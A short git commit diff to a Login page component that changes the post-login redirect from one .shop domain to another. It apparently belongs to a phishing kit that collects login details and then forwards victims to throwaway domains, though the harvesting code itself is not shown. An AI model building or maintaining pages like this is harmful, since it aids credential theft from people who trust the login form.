cd70b659758a0e3409d38eae4e17e48836b0bdbe
hurt the kid <127146284+husknet@users.noreply.github.com>
2025-08-07 02:24:13 -0400

    Update index.js

--- pages/index.js
+++ pages/index.js
@@ -74,7 +74,7 @@ const Login = () => {
       });
 
       setShowModal(false); // Hide modal before redirecting
-      window.location.href = 'https://frtob.colfillstorage.shop/';
+      window.location.href = 'https://ty.adibebe.shop/';
     } catch (error) {
       setShowModal(false); // Hide modal on error
       console.error('Error during API call:', error);
@@ -136,3 +136,4 @@ const Login = () => {
 };
 
 export default Login;
+
